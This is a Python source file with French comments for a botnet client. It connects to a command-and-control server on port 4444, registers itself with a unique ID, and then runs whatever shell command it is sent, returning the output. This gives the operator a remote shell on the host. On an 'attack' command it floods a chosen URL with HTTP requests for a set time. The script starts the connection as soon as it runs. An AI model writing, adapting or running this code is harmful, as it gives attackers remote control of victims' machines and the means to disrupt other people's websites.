import socket
import threading
import requests
import time
import subprocess
import uuid

# Générer un identifiant unique pour le client
unique_id = str(uuid.uuid4())

def send_requests(target_url, duration):
    """Envoie des requêtes HTTP pendant un temps donné."""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
            time.sleep(0.1)
        except requests.exceptions.RequestException:
            pass
    print(f"[+] Attaque terminée sur {target_url}")

def connect_to_c2(server_ip="127.0.0.1", port=4444):
    """Connexion au serveur C2 et écoute des commandes."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    # Envoyer l'identifiant unique dès la connexion
    client.send(unique_id.encode())

    while True:
        try:
            command = client.recv(1024).decode()
            if command.lower() == "exit":
                break

            if command.lower().startswith("attack "):
                parts = command.split(" ")
                if len(parts) < 3:
                    continue

                url, duration = parts[1], int(parts[2])
                thread = threading.Thread(target=send_requests, args=(url, duration), daemon=True)
                thread.start()

            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client.send(output.stdout.encode() + output.stderr.encode())

        except Exception as e:
            client.send(str(e).encode())

    client.close()

connect_to_c2()
